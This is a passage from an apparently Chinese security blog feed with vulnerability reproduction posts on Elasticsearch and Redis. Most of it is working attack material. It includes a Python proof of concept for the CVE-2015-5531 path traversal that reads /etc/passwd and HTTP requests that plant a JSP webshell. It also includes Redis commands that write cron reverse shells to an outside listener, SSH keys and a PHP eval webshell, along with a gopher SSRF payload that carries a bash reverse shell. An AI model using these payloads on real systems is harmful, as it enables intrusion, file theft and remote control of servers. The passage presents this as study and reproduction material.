class="hljs-punctuation">&#123;</span></span><br><span class="language-json">    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;fs&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">     <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span></span><br><span class="language-json">           <span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">               <span class="hljs-attr">&quot;location&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/usr/share/elasticsearch/repo/test/snapshot-backdata&quot;</span></span><br><span class="language-json">           <span class="hljs-punctuation">&#125;</span></span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>之后访问 <code>http://your-ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code>即可得到&#x2F;etc&#x2F;passwd的内容<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/es-6.png"><br>其中返回的值是ascii码可以通过浏览器控制台的 String.fromCharCode函数解码<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/es-7.png"><br>附网上poc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><br><span class="hljs-comment">#PoC for CVE - 2015 - 5531 - Reported by Benjamin Smith# Affects ElasticSearch 1.6.0 and prior</span><br><span class="hljs-comment"># Pedro Andujar || twitter: pandujar || email: @segfault.es || @digitalsec.net# Jose A.Guasch || twitter: @SecByDefault || jaguasch at gmail.com</span><br><span class="hljs-comment"># Tested on default Linux(.deb) install || requires path.repo: to be set on config file</span><br><br><span class="hljs-keyword">import</span> urllib, urllib2, json, sys, re<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;!dSR script for CVE-2015-5531\n&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; &gt; <span class="hljs-number">3</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Ex: %s www.example.com /etc/passwd&quot;</span> % sys.argv[<span class="hljs-number">0</span>]<br>sys.exit()<br><br><br>host = sys.argv[<span class="hljs-number">1</span>]<br>fpath = urllib.quote(sys.argv[<span class="hljs-number">2</span>], safe = <span class="hljs-string">&#x27;&#x27;</span>)<br>port = <span class="hljs-number">9200</span><br>trav = <span class="hljs-string">&#x27;ev1l%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..&#x27;</span><br>reponame = <span class="hljs-string">&#x27;pwn&#x27;</span><br>baseurl = <span class="hljs-string">&quot;http://%s:%s/_snapshot/&quot;</span> % (host, port)<br>xplurl = <span class="hljs-string">&#x27;%s%s/%s%s&#x27;</span> % (baseurl, reponame, trav, fpath)<br><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">createSnapdirs</span>():<br>    <span class="hljs-keyword">try</span>:<br>        url = <span class="hljs-string">&quot;%s/%s&quot;</span> % (baseurl, reponame)<br>        request = urllib2.Request(url, data = <span class="hljs-string">&#x27;&#123;&quot;type&quot;:&quot;fs&quot;,&quot;settings&quot;:&#123;&quot;location&quot;:&quot;dsr&quot;&#125;&#125;&#x27;</span>)<br>        request.get_method = <span class="hljs-keyword">lambda</span>: <span class="hljs-string">&#x27;POST&#x27;</span><br>        urllib2.urlopen(request)<br><br><br>        url = <span class="hljs-string">&quot;%s/%sie&quot;</span> % (baseurl, reponame)<br>        request = urllib2.Request(url, data = <span class="hljs-string">&#x27;&#123;&quot;type&quot;:&quot;fs&quot;,&quot;settings&quot;:&#123;&quot;location&quot;:&quot;dsr/snapshot-ev1l&quot;&#125;&#125;&#x27;</span>)<br>        request.get_method = <span class="hljs-keyword">lambda</span>: <span class="hljs-string">&#x27;POST&#x27;</span><br>        urllib2.urlopen(request)<br>    <span class="hljs-keyword">except</span> urllib2.HTTPError, e:<br>        data = json.load(e)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[!] ERROR: Verify path.repo exist in config file, elasticsearch.yml:\n&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(data[<span class="hljs-string">&#x27;error&#x27;</span>])<br>        sys.exit()<br><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">grabFile</span>(<span class="hljs-params">xplurl</span>):<br>    <span class="hljs-keyword">try</span>:<br>        urllib2.urlopen(xplurl)<br>        <span class="hljs-keyword">except</span> urllib2.HTTPError, e:<br>        data = json.load(e)<br>        extrdata = re.findall(r <span class="hljs-string">&#x27;\d+&#x27;</span>, <span class="hljs-built_in">str</span>(data[<span class="hljs-string">&#x27;error&#x27;</span>]))<br>        decoder = <span class="hljs-built_in">bytearray</span>()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> extrdata[+<span class="hljs-number">2</span>: ]:<br>            decoder.append(<span class="hljs-built_in">int</span>(i))<br>        <span class="hljs-built_in">print</span> decoder<br><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    createSnapdirs()<br>    grabFile(xplurl)<br><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h2 id="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"><a href="#Elasticsearch写入webshell漏洞（WooYun-2015-110216）" class="headerlink" title="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"></a>Elasticsearch写入webshell漏洞（WooYun-2015-110216）</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。<br>所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。<br>和CVE-2015-5531类似，该漏洞和备份仓库有关。在elasticsearch1.5.1以后，其将备份仓库的根路径限制在配置文件的配置项path.repo中，而且如果管理员不配置该选项，则默认不能使用该功能。即使管理员配置了该选项，web路径如果不在该目录下，也无法写入webshell。所以该漏洞影响的ElasticSearch版本是1.5.x以前。</p><h3 id="影响范围-3"><a href="#影响范围-3" class="headerlink" title="影响范围"></a>影响范围</h3><p>elasticsearch 1.5.1及以前，无需任何配置即可触发该漏洞。之后的新版，配置文件elasticsearch.yml中必须存在path.repo，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能。</p><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol><li><p>创建一个恶意索引文档：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile">POST /a.jsp/a.jsp/1 HTTP/1.1<br><span class="hljs-section">Host:x.x.x.x:9200</span><br><span class="hljs-section">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0</span><br><span class="hljs-section">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="hljs-section">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-section">Accept-Encoding: gzip, deflate</span><br><span class="hljs-section">Connection: close</span><br><span class="hljs-section">Cookie: settingStore=1630480512401_0</span><br><span class="hljs-section">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-section">Cache-Control: max-age=0</span><br><span class="hljs-section">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-section">Content-Length: 228</span><br><br><br>&#123;<span class="hljs-string">&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.getParameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;<br></code></pre></td></tr></table></figure></li><li><p>创建一个恶意的存储库，其中location为要写入的路径，根据目标机器的Tomcat的www目录决定</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/_snapshot/a.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>x.x.x.x:9200<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>settingStore=1630480512401_0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>107<br><br><span class="language-json"></span><br><span class="language-json"><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json"><span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;fs&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json"><span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span></span><br><span class="language-json"><span class="hljs-attr">&quot;location&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/usr/local/tomcat/webapps/wwwroot/&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json"><span class="hljs-attr">&quot;compress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span></span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure></li><li><p>存储库验证并创建</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/_snapshot/a.jsp/a.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>x.x.x.x:9200<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>settingStore=1630480512401_0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>102<br><br><span class="language-json"></span><br><span class="language-json"><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">     <span class="hljs-attr">&quot;indices&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a.jsp&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">     <span class="hljs-attr">&quot;ignore_unavailable&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">     <span class="hljs-attr">&quot;include_global_state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span></span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure></li></ol><p>此时，我们访问<code>http://x.x.x.x:8080/wwwroot/indices/a.jsp/snapshot-a.jsp</code>发现如下界面即表示该文件上传成功<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/es-9.png"><br>之后我们访问<code>http://x.x.x.x:8080/wwwroot/indices/a.jsp/snapshot-a.jsp?f=xxxxx</code><br>其中，xxx部分为想写入的webshell内容，写入后访问<code>http://x.x.x.x:8080/wwwroot/test.jsp即可获取webshell</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>redis 漏洞学习</title>
    <link href="/cllafrcor000ffout5nmf8vc4/"/>
    <url>/cllafrcor000ffout5nmf8vc4/</url>
    
    <content type="html"><![CDATA[<h1 id="redis漏洞学习及复现"><a href="#redis漏洞学习及复现" class="headerlink" title="redis漏洞学习及复现"></a>redis漏洞学习及复现</h1><h2 id="Redis-4-x-5-x-主从复制导致的命令执行"><a href="#Redis-4-x-5-x-主从复制导致的命令执行" class="headerlink" title="Redis 4.x&#x2F;5.x 主从复制导致的命令执行"></a>Redis 4.x&#x2F;5.x 主从复制导致的命令执行</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Redis主从复制RCE漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机只负责读，主机只负责写。在Reids 4.x之后，通过外部拓展，可以实现在redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机(此处为kali)实例可以通过FULLRESYNC同步文件到从机(此处为CentOS)上。然后在从机上加载恶意so文件，即可执行命令。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Redis 4.x&#x2F;5.x</p><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>利用网上的<a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">poc</a>进行复现，该poc要先make一下，出现exp.so即可<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/redis-1.png"><br>rhost 即为目标机器 ，lhost为本地机器，执行后会提示使用交互式shell还是反弹shell，按提示进行即可</p><h2 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>redis默认没有密码，可能会导致redis的未授权访问</p><h3 id="漏洞利用方式："><a href="#漏洞利用方式：" class="headerlink" title="漏洞利用方式："></a>漏洞利用方式：</h3><h4 id="写入计划任务"><a href="#写入计划任务" class="headerlink" title="写入计划任务"></a>写入计划任务</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">// 设置key set getshell <br>&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.210.10/2333 0&gt;&amp;1\n&quot; <br>// 设置路径 <br>config set dir /var/spool/cron/ <br>// 设置文件名 <br>config set dbfilename root <br>// 保存key值到root文件中 <br>save<br></code></pre></td></tr></table></figure><h4 id="写入ssh公钥"><a href="#写入ssh公钥" class="headerlink" title="写入ssh公钥"></a>写入ssh公钥</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">// 生成公私钥 <br>ssh-keygen -t rsa <br>// 防止乱码,导出key <br>(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt<br>// 导入内容 <br>cat key.txt| redis-cli -h 192.168.210.13 -x set putsshkey<br>// 设置路径 <br>config set dir /root/.ssh <br>// 设置文件名 <br>config set dbfilename authorized_keys <br>// 保存key值到root文件中 <br>save<br><br><br><br>远程登录ssh：<br>ssh -i id_rsa root@192.168.210.13<br></code></pre></td></tr></table></figure><h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">config set dir /var/www/html/ <br>config set dbfilename webshell.php <br>set x &#x27;&lt;?php @eval($_GET[&quot;cmd&quot;]);phpinfo();?&gt;&#x27; <br>save<br></code></pre></td></tr></table></figure><h2 id="ssrf-redis"><a href="#ssrf-redis" class="headerlink" title="ssrf+redis"></a>ssrf+redis</h2><h3 id="curl-gopher"><a href="#curl-gopher" class="headerlink" title="curl+gopher"></a>curl+gopher</h3><p>gopher协议是比http协议更早出现的协议，现在已经不常用了，但是在SSRF漏洞利用中gopher可以说是万金油，因为可以使用gopher发送各种格式的请求包，这样就可以解决漏洞点不在GET参数的问题了。<br>gopher协议可配合linux下的curl命令伪造POST请求包发给内网主机。<br>此种方法能攻击成功的前提条件是：redis是以root权限运行的<br>payload如下(可以使用<a href="https://github.com/firebroo/sec_tools/tree/master/">工具</a>生成payload)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -v &#x27;http://xxx.xxx.xx.xx/xx.php?url=<br>gopher://172.21.0.2:6379/<br>_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.220.140%2f2333%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#x27;<br></code></pre></td></tr></table></figure><p>redis命令进行了两次url编码，这里是通过gopher协议伪造的请求包用curl命令来发送；<br>payload采用的是bash反弹，定时程序路径是&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root<br>发送请求之前在公网机192.168.220.140开启nc监听端口2333</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lvp 2333 （或nc -l 2333）<br></code></pre></td></tr></table></figure><h3 id="dict协议写入shell"><a href="#dict协议写入shell" class="headerlink" title="dict协议写入shell"></a>dict协议写入shell</h3><p>如果服务端不支持gopher协议，可尝试dict协议，不过通过dict协议的话要一条一条的执行，而gopher协议执行一条命令就行了。<br>curl扩展也支持dict协议，可以配合curl命令发送请求，但也可以直接在浏览器上或者bp发包请求。<br>可通过以下三条命令看是否能利用dict:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/xx.php?url=dict://172.21.0.2:6379/info<br>/xx.php?url=dict://172.21.0.2:6379/get:user<br>/xx.php?url=dict://172.21.0.2:6379/flushall<br></code></pre></td></tr></table></figure><p>利用过程：</p><ol><li>先清除没用的数据，防止定时任务执行失败<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=dict:<span class="hljs-regexp">//</span><span class="hljs-number">172.21</span>.<span class="hljs-number">0.2</span>:<span class="hljs-number">6379</span>/flushall<br></code></pre></td></tr></table></figure></li><li>设置dbfile文件名<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">url=<span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/172.21.0.2:6379/config</span><span class="hljs-symbol">:set</span><span class="hljs-symbol">:dir</span><span class="hljs-symbol">:/var/www/html</span><br></code></pre></td></tr></table></figure></li><li>写入webshell<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=dict:<span class="hljs-regexp">//</span><span class="hljs-number">172.21</span>.<span class="hljs-number">0.2</span>:<span class="hljs-number">6379</span>/set:webshell:<span class="hljs-string">&quot;\x3c\x3f\x70\x68\x70\x20\x70\x68\x70\x69\x6e\x66\x6f\x28\x29\x3b\x20\x3f\x3e&quot;</span><br></code></pre></td></tr></table></figure></li><li>save保存<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=dict:<span class="hljs-regexp">//</span><span class="hljs-number">172.21</span>.<span class="hljs-number">0.2</span>:<span class="hljs-number">6379</span>/save<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
